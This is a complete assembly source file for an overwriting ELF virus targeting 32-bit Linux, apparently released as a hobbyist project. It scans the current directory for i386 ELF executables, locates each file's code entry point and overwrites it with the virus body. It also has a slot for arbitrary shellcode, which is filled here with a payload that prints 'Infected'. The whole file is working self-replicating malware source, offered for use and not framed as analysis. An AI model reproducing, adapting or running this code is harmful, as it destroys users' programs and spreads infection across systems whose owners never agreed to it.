; This program is free software. It comes without any warranty, to
; the extent permitted by applicable law. You can redistribute it
; and/or modify it under the terms of the Do What The Fuck You Want
; To Public License, Version 2, as published by Sam Hocevar. See
; COPYING for more details.
;
; Infects ELF executable files (Overwriting)- infector.s
; Infects all ELF executable files in the current directory
; Jeanne-Kamikaze
;
; A normal exit denotes the target file has been successfully infected.
; Other exits (non-zero) stand for error.
;
; Edi holds the file descriptor.
; Esi is used to restore ret.

BITS 32

section .code
	global _start

_start:

virii_start:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
allocate_variables:
	;ebp+0  = 4 bytes variable for file reading.
	;ebp+4  = 4 bytes variable to store the entry points.
	;ebp+8  = 4 bytes variable to store the address of virii_start
	;ebp+12 = 4 bytes variable to store the address of virii_end
	;ebp+16 = 4 bytes variable to store directory file descriptor
	;ebp+20 = 268 bytes buffer for dirent structure
	
	sub esp, 288
	mov ebp, esp
	
calculations:
	
	;We need to calculate the address where the virus
	;starts in memory at the time of execution.
	
	call get_start_addr
	
get_start_addr:
	pop esi
	sub esi, 21 ;the offset from the very first instruction.
	
	;Esi now holds the memory address where the virus starts.
	;Store value on stack for future use.
	mov [ebp+8], esi
	
	;Now calculate the end address
	jmp end_address
	
get_end_addr:
	pop esi
	
	;Esi now holds the memory address where the virus ends.
	;Store value on stack for future use.
	mov [ebp+12], esi
	
open_directory:
	;int open(const char *pathname, int flags);
	;const O_RDONLY = 0;
	
	;O_RDWR flag
	xor ecx, ecx
	
	;OR it with the O_DIRECTORY flag
	or ecx, 0x10000
	
	jmp pathname
	
pathname:
	call open_directory_2
	db './', 0

open_directory_2:
	pop ebx
	
	mov eax, 5
	int 0x80
	
	cmp eax, -1
	je near clean_exit
	
	cmp eax, -14
	je near clean_exit
	
	;Save the file descriptor
	mov [ebp+16], eax
	
get_next_file:
	xor edx, edx
	
	;Pointer to dirent structure
	lea ecx, [ebp+20]
	
	;File descriptor
	mov ebx, [ebp+16]
	
	;readdir system call
	mov eax, 89
	
	int 0x80
	
	;Success ?
	cmp eax, 1
	jne near close_dir
	
	;Ignore .
	cmp word [ebp+30], 0x002E
	je get_next_file
	
	;Ignore ..
	cmp word [ebp+30], 0x2E2E
	je get_next_file
	
open:
	;int open(const char *pathname, int flags);
	;const O_RDWR = 2;
	
	;O_RDWR flag
	xor ecx, ecx
	mov cl, 0x2
	
	;Pointer to file name
	lea ebx, [ebp+30]
	
	;Time to call open()
	mov al, 5
	int 0x80
	
	;Error ?
	cmp eax, 0
	jl get_next_file
	
	;Put file descriptor in edi
	mov edi, eax
	
check_if_elf:
	;Read the first four bytes of the file, and check
	;if it reads 7F 45 4C 46 (7f + "ELF" in reverse order).
	
	;First move the cursor to the desired position, byte 0
	
	;Push the file descriptor
	push edi
	
	;Push the offset
	xor eax, eax
	push eax
	
	;Push SEEK_SET(beginning of file)
	push eax
	
	call lseek
	
	;Now read
	
	;Push file descriptor
	push edi
	
	;Push buffer address
	lea eax, [ebp+0]
	push eax
	
	;Push the number of bytes to read
	mov eax, 4
	push eax
	
	call read
	
	;Is it an ELF file ?
	mov eax, [ebp+0]
	cmp eax, 0x464C457F
	jne get_next_file
	
check_if_executable:
	;Read bytes 16 and 17 (counting from 0) and compare to 02 00.
	
	;First move the cursor to the desired position, bytes 16 and 17
	
	;Push the file descriptor
	push edi
	
	;Push the offset
	mov eax, 16
	push eax
	
	;Push SEEK_SET (beginning of file)
	xor eax, eax
	push eax
	
	call lseek
	
	;Now read
	
	;Push file descriptor
	push edi
	
	;Push buffer address
	lea eax, [ebp+0]
	push eax
	
	;Push the number of bytes to read
	mov eax, 2
	push eax

	call read
	
	;Is it an executable file ?
	mov eax, [ebp+0]
	cmp ax, 0x0002
	jne get_next_file
	
check_if_80386:
	;Read bytes 18 and 19 (counting from 0) and compare to 03 00.
	
	;First move the cursor to the desired position, bytes 18 and 19.
	
	;Push file descriptor
	push edi
	
	;Push the offset
	mov eax, 18
	push eax
	
	;Push SEEK_SET (beginning of file)
	xor eax, eax
	push eax
	
	call lseek
	
	;Now read
	
	;Push file descriptor
	push edi
	
	;Push buffer address
	lea eax, [ebp+0]
	push eax
	
	;Push the number of bytes to read
	mov eax, 2
	push eax
	
	call read
	
	;Is it suitable for the 80386 intel architecture ?
	mov eax, [ebp+0]
	cmp ax, 0x0003
	jne get_next_file
	
read_code_memory_entry_point:
	;Find out the address in memory where control of execution is passed to.
	;Corresponds to bytes 24-27
	
	;Move the cursor to the desired position, byte 24
	
	;Push file descriptor
	push edi
	
	;Push offset
	mov eax, 24
	push eax
	
	;Push SEEK_SET (beginning of file)
	xor eax, eax
	push eax
	
	call lseek
	
	;Read the memory entry point.
	
	;Push file descriptor
	push edi
	
	;Push buffer address
	lea eax, [ebp+4]
	push eax
	
	;Push number of bytes to read
	mov eax, 4
	push eax
	
	call read
	
find_out_section_header_offset:
	;e_shoff takes bytes 32 to 35. We need to read it
	;and store the section header address temporarily
	;so that we can later jump to it.
	
	;Move the cursor to the desired position, byte 32
	
	;Push file descriptor
	push edi
	
	;Push the offset
	mov eax, 32
	push eax
	
	;Push SEEK_SET (beginning of file)
	xor eax, eax
	push eax
	
	call lseek
	
	;Now read
	
	;Push file descriptor
	push edi
	
	;Push buffer address
	lea eax, [ebp+0]
	push eax
	
	;Push the number of bytes to read
	mov eax, 4
	push eax
	
	call read
	
move_to_section_header:
	;Move the cursor to the desired position, [ebp+0]
	
	;Push file descriptor
	push edi
	
	;Push the offset
	mov eax, [ebp+0]
	push eax
	
	;Push SEEK_SET (beginning of file)
	xor eax, eax
	push eax
	
	call lseek
	
read_entry_point_loop:
	;Now read 4 bytes until we find the memory entry point, ebp+4.
	
	;Push file descriptor
	push edi
	
	;Push buffer address
	lea eax, [ebp+0]
	push eax
	
	;Push number of bytes to read
	mov eax, 4
	push eax
	
	call read
	
	mov eax, [ebp+0]	
	cmp eax, [ebp+4]
	jne read_entry_point_loop
	
read_code_file_entry_point:
	;Read the next 4 bytes
	
	;Push file descriptor
	push edi
	
	;Push buffer address
	lea eax, [ebp+0]
	push eax
	
	;Push number of bytes to read
	mov eax, 4
	push eax
	
	call read
	
jump_to_code_file_entry_point:
	
	;Push file descriptor
	push edi
	
	;Push the offset
	push dword [ebp+0]
	
	;Push SEEK_SET (beginning of file)
	xor eax, eax
	push eax
	
	call lseek

write:
	;Get the virus code size in memory
	mov edx, [ebp+12]
	sub edx, [ebp+8]
	
	;Start writing from the start of the virus code
	mov ecx, [ebp+8]
	
	;Move the file descriptor into ebx
	mov ebx, edi
	
	;Write system call
	xor eax, eax
	mov al, 4
	
	;Call write
	int 0x80
	
	;Error ?
	cmp eax, -1
	je get_next_file
	
close:
	;Close the file descriptor
	mov ebx, edi
	xor eax, eax
	mov al, 6
	int 0x80
	
	jmp get_next_file
	
close_dir:
	;Close the directory file descriptor
	mov ebx, [ebp+16]
	xor eax, eax
	mov al, 6
	int 0x80
	
payload:
    ;Put desired shellcode here
	db 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0x6a,0x0a,0x68,0x63,0x74,0x65,0x64
	db 0x68,0x49,0x6e,0x66,0x65,0x89,0xe1,0xb2,0x09,0xb3,0x01,0xb0,0x04,0xcd,0x80
	
	jmp clean_exit
	
error:
	;Close the file descriptor
	mov ebx, edi
	xor eax, eax
	mov al, 6
	int 0x80
	
	xor ebx, ebx
	mov bl, 1
	jmp exit
	
clean_exit:
	xor ebx, ebx

exit:
	xor eax, eax
	mov al, 1
	int 0x80
	
read:
	;Reads a given number of bytes from a given file descriptor
	;and stores the result in a given address of memory.
	
	;pop the return address
	pop esi
	
	pop edx
	pop ecx
	pop ebx
	
	xor eax, eax
	mov al, 3
	
	int 0x80
	
	;Check if the number of bytes read equals the number of bytes
	;we actually wanted to read. If not, throw an error.
	
	cmp eax, edx
	jne get_next_file
	
	;restore the return address and return
	push esi
	ret
	
lseek:
	;Repositions the offset of the open file associated with the file
	;descriptor fildes to the argument offset according to the directive
	;whence.
	
	;pop the return address
	pop esi
	
	pop edx
	pop ecx
	pop ebx
	
	xor eax, eax
	mov al, 19
	int 0x80
	
	;Error ?
	cmp eax, -1
	je get_next_file
	
	;restore the return address and return
	push esi
	ret
	
end_address:
	call get_end_addr
	db 0x90
	
virii_end:
